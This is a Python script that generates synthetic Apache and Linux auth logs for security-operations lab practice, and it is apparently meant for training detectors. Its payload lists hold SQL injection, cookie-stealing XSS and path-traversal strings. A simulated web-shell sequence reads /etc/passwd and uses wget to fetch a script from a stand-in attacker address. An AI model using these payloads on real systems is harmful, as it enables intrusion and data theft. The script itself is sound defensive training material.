#!/usr/bin/env python3
"""
Generate synthetic Apache access + Linux auth logs for SOC lab practice.

The data is fake but follows the real formats and real-world ratios:
  - auth.log is syslog format (timestamp, host, sshd[pid]) like Debian/Ubuntu.
  - Most traffic is benign; attacks are a small slice, as on a real server.
  - Brute force = hundreds of failures, almost never a success.
  - One planted compromise (password login right after a brute-force run)
    so the detector has a true positive, plus one employee who mistypes his
    password twice (a false-positive trap the detector must NOT flag).
  - Apache uses Combined Log Format with timezone, referer and user-agent;
    attack payloads are URL-encoded the way Apache actually logs them.

Attacker IPs come from RFC 5737 documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24) so nothing points at a real host.
No network calls.

Usage:
  python3 generate_sample_logs.py [--out DIR] [--seed N]
"""
import argparse
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote

REPO_ROOT = Path(__file__).resolve().parents[2]
TZ = timezone(timedelta(hours=2))  # SAST
START = datetime(2026, 10, 14, 0, 0, 0, tzinfo=TZ)
HOST = "web01"

INTERNAL_ADMINS = {"10.0.0.5": "deploy", "10.0.0.8": "sipho", "10.0.0.12": "thabo"}
REAL_USERS = ["admin", "deploy", "root", "sipho", "thabo", "ubuntu", "www-data"]
SCAN_USERS = ["root", "admin", "test", "user", "ubuntu", "oracle", "postgres",
              "git", "ftp", "pi", "guest", "support", "mysql", "hadoop",
              "jenkins", "minecraft", "steam", "debian", "centos", "ec2-user"]

BRUTE_IP = "203.0.113.47"        # loud, never gets in
COMPROMISE_IP = "198.51.100.23"  # slower brute force that succeeds
COMPROMISE_USER = "admin"


def doc_ip(rng):
    net = rng.choice(["192.0.2", "198.51.100", "203.0.113"])
    return f"{net}.{rng.randint(1, 254)}"


def syslog_ts(ts):
    # syslog pads the day with a space: "Oct  4", "Oct 14"
    return f"{ts.strftime('%b')} {ts.day:2d} {ts.strftime('%H:%M:%S')}"


# --------------------------------------------------------------------------
# auth.log
# --------------------------------------------------------------------------
class AuthLog:
    def __init__(self, rng):
        self.rng = rng
        self.events = []  # (datetime, seq, text)

    def add(self, ts, proc, msg):
        self.events.append((ts, len(self.events), f"{proc}: {msg}"))

    def pid(self):
        return self.rng.randint(1000, 65000)

    def port(self):
        return self.rng.randint(32768, 60999)

    def failed(self, ts, ip, user):
        sshd, port = f"sshd[{self.pid()}]", self.port()
        if user in REAL_USERS:
            self.add(ts, sshd, "pam_unix(sshd:auth): authentication failure; logname= "
                     f"uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}")
            self.add(ts + timedelta(seconds=2), sshd,
                     f"Failed password for {user} from {ip} port {port} ssh2")
        else:
            self.add(ts, sshd, f"Invalid user {user} from {ip} port {port}")
            self.add(ts + timedelta(seconds=2), sshd,
                     f"Failed password for invalid user {user} from {ip} port {port} ssh2")
        end = ts + timedelta(seconds=3)
        if self.rng.random() < 0.5:
            self.add(end, sshd, f"Connection closed by authenticating user {user} {ip} port {port} [preauth]")
        else:
            self.add(end, sshd, f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]")

    def accepted(self, ts, ip, user, method="publickey"):
        sshd, port = f"sshd[{self.pid()}]", self.port()
        extra = ""
        if method == "publickey":
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            extra = ": ED25519 SHA256:" + "".join(self.rng.choice(alphabet) for _ in range(43))
        uid = 0 if user == "root" else 1000 + REAL_USERS.index(user)
        self.add(ts, sshd, f"Accepted {method} for {user} from {ip} port {port} ssh2{extra}")
        self.add(ts, sshd, f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)")
        self.add(ts, "systemd-logind[612]", f"New session {self.rng.randint(100, 999)} of user {user}.")
        dur = timedelta(minutes=self.rng.randint(2, 90))
        self.add(ts + dur, sshd, f"Received disconnect from {ip} port {port}:11: disconnected by user")
        self.add(ts + dur, sshd, f"pam_unix(sshd:session): session closed for user {user}")

    def build(self):
        rng = self.rng
        # cron every 10 minutes, all day
        t = START
        while t < START + timedelta(days=1):
            p = self.pid()
            self.add(t + timedelta(seconds=1), f"CRON[{p}]",
                     "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
            self.add(t + timedelta(seconds=2), f"CRON[{p}]",
                     "pam_unix(cron:session): session closed for user root")
            t += timedelta(minutes=10)

        # legit admin logins during work hours (publickey)
        for ip, user in INTERNAL_ADMINS.items():
            for _ in range(rng.randint(2, 4)):
                self.accepted(START + timedelta(hours=rng.uniform(7.5, 17.5)), ip, user)

        # false-positive trap: thabo fat-fingers his password twice, then gets in
        ts = START + timedelta(hours=13, minutes=4)
        self.failed(ts, "10.0.0.12", "thabo")
        self.failed(ts + timedelta(seconds=9), "10.0.0.12", "thabo")
        self.accepted(ts + timedelta(seconds=21), "10.0.0.12", "thabo", method="password")

        # background internet noise: many IPs, short bursts
        for _ in range(rng.randint(18, 26)):
            ip = doc_ip(rng)
            if ip in (BRUTE_IP, COMPROMISE_IP):
                continue
            ts = START + timedelta(hours=rng.uniform(0, 23.5))
            for _ in range(rng.choices([1, 2, 3, 4, 6, 8, 14, 30], weights=[30, 20, 15, 10, 8, 6, 3, 2])[0]):
                self.failed(ts, ip, rng.choice(SCAN_USERS))
                ts += timedelta(seconds=rng.uniform(1.5, 8))

        # loud brute force: root first, then a username dictionary
        ts = START + timedelta(hours=2, minutes=13)
        for i in range(rng.randint(550, 700)):
            self.failed(ts, BRUTE_IP, "root" if i < 400 else rng.choice(SCAN_USERS))
            ts += timedelta(seconds=rng.uniform(0.8, 3.0))

        # the real incident: slower brute force on admin, then a successful password login
        ts = START + timedelta(hours=21, minutes=37)
        for _ in range(rng.randint(140, 190)):
            self.failed(ts, COMPROMISE_IP, rng.choice([COMPROMISE_USER] * 4 + ["root", "deploy"]))
            ts += timedelta(seconds=rng.uniform(4, 11))
        self.accepted(ts + timedelta(seconds=6), COMPROMISE_IP, COMPROMISE_USER, method="password")

        self.events.sort(key=lambda e: (e[0], e[1]))
        return [f"{syslog_ts(ts)} {HOST} {msg}" for ts, _, msg in self.events]


# --------------------------------------------------------------------------
# Apache access.log (Combined Log Format)
# --------------------------------------------------------------------------
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
]
BOT_UAS = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
           "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"]
PAGES = [("/", 200), ("/about", 200), ("/contact", 200), ("/products", 200),
         ("/products/item?id=12", 200), ("/products/item?id=7", 200),
         ("/login", 200), ("/dashboard", 302), ("/api/users/me", 200),
         ("/static/css/site.css", 200), ("/static/js/app.js", 200),
         ("/favicon.ico", 200), ("/robots.txt", 200), ("/old-page", 404)]
SAFE = "/?=&;:,.-_()"

SQLI = ["/products/item?id=12' OR '1'='1",
        "/products/item?id=12 UNION ALL SELECT NULL,NULL,version()-- -",
        "/products/item?id=12 AND SLEEP(5)",
        "/login?user=admin'--",
        "/products/item?id=-1 UNION SELECT table_name,2 FROM information_schema.tables-- -",
        "/search?q=1'; DROP TABLE users;--"]
XSS = ["/search?q=<script>alert(document.cookie)</script>",
       "/search?q=\"><img src=x onerror=alert(1)>",
       "/contact?name=<svg onload=alert(1)>",
       "/search?q=javascript:alert(1)"]
TRAVERSAL = ["/download?file=../../../../etc/passwd",
             "/download?file=..%2f..%2f..%2fetc%2fpasswd",
             "/include?page=../../config/database.php"]
RECON = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin/",
         "/server-status", "/backup.zip", "/config.php.bak", "/xmlrpc.php"]


class ApacheLog:
    def __init__(self, rng):
        self.rng = rng
        self.events = []

    def add(self, ts, ip, method, path, status, ua, referer="-", size=None):
        if size is None:
            size = self.rng.randint(800, 48000) if status == 200 else self.rng.randint(150, 600)
        if status == 304:
            size = "-"
        path = path.replace(" ", "%20") if "%" in path else quote(path, safe=SAFE)
        self.events.append((ts, len(self.events),
                            f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S %z")}] '
                            f'"{method} {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"'))

    def build(self, n_normal=1850):
        rng = self.rng
        visitors = [f"10.0.{rng.randint(0, 3)}.{rng.randint(2, 250)}" for _ in range(60)]
        bots = [doc_ip(rng) for _ in range(4)]
        hour_weights = [1, 1, 1, 1, 1, 2, 4, 7, 9, 10, 10, 9, 9, 10, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1]
        for _ in range(n_normal):
            hour = rng.choices(range(24), weights=hour_weights)[0]
            ts = START + timedelta(hours=hour, seconds=rng.randint(0, 3599))
            if rng.random() < 0.06:
                ip, ua = rng.choice(bots), rng.choice(BOT_UAS)
            else:
                ip, ua = rng.choice(visitors), rng.choice(BROWSER_UAS)
            path, status = rng.choice(PAGES)
            if status == 200 and rng.random() < 0.15:
                status = 304
            method = "POST" if path == "/login" and rng.random() < 0.3 else "GET"
            self.add(ts, ip, method, path, status, ua,
                     referer=rng.choice(["-", "https://example.co.za/", "https://www.google.com/"]))

        # sqlmap run -- the 500s are the giveaway
        ip, ts = "203.0.113.88", START + timedelta(hours=3, minutes=41)
        for _ in range(rng.randint(70, 110)):
            self.add(ts, ip, "GET", rng.choice(SQLI), rng.choice([200, 500, 500, 403]),
                     "sqlmap/1.8.4#stable (https://sqlmap.org)")
            ts += timedelta(seconds=rng.uniform(0.2, 1.5))

        # manual XSS probing from a browser
        ip, ts = "198.51.100.140", START + timedelta(hours=11, minutes=5)
        for _ in range(rng.randint(12, 20)):
            self.add(ts, ip, "GET", rng.choice(XSS), rng.choice([200, 200, 403]), BROWSER_UAS[4])
            ts += timedelta(seconds=rng.uniform(5, 40))

        # traversal + recon scanner (Nikto)
        ip, ts = "192.0.2.77", START + timedelta(hours=15, minutes=22)
        for _ in range(rng.randint(60, 90)):
            self.add(ts, ip, "GET", rng.choice(TRAVERSAL + RECON * 2),
                     rng.choice([404, 404, 404, 403, 400]), "Mozilla/5.0 (Nikto/2.5.0)")
            ts += timedelta(seconds=rng.uniform(0.1, 0.8))

        # web shell: upload, then commands through it
        ip, ts = "203.0.113.150", START + timedelta(hours=22, minutes=48)
        self.add(ts, ip, "GET", "/admin/upload", 200, BROWSER_UAS[0])
        self.add(ts + timedelta(seconds=14), ip, "POST", "/admin/upload.php", 200, BROWSER_UAS[0], size=74)
        ts += timedelta(seconds=30)
        for cmd in ["id", "whoami", "uname -a", "cat /etc/passwd", "ls -la /var/www",
                    "wget http://203.0.113.150/x.sh -O /tmp/x.sh"]:
            self.add(ts, ip, "GET", f"/uploads/img_4821.php?cmd={cmd}", 200, BROWSER_UAS[0],
                     size=rng.randint(20, 3000))
            ts += timedelta(seconds=rng.uniform(5, 25))

        self.events.sort(key=lambda e: (e[0], e[1]))
        return [line for _, _, line in self.events]


def main():
    ap = argparse.ArgumentParser(description="Generate synthetic SOC practice logs.")
    ap.add_argument("--out", default=str(REPO_ROOT / "logs"), help="output directory (default: <repo>/logs)")
    ap.add_argument("--seed", type=int, default=None, help="random seed for reproducible output")
    args = ap.parse_args()

    rng = random.Random(args.seed)
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    auth = AuthLog(rng).build()
    (out / "linux_auth.log").write_text("\n".join(auth) + "\n")
    print(f"[+] {out / 'linux_auth.log'}: {len(auth)} lines")

    apache = ApacheLog(rng).build()
    (out / "apache_access.log").write_text("\n".join(apache) + "\n")
    print(f"[+] {out / 'apache_access.log'}: {len(apache)} lines")


if __name__ == "__main__":
    main()
